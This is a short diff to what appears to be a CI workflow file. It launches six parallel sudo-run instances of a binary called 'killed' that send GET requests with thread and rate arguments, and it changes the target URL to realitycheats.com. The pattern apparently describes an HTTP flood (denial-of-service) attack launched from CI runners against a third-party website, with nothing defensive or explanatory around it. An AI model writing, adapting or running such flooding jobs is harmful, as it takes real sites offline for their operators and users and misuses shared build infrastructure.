@@ -20,7 +20,7 @@ jobs:
           chmod +x killed
           PIDS=()
           for i in {1..6}; do
-            sudo timeout 105 ./killed GET https://fluxstress.to/assets/favicon.ico fres.txt 100 128 10 &
+            sudo timeout 105 ./killed GET https://realitycheats.com/ fres.txt 100 128 10 &
             PIDS+=($!)
           done
           
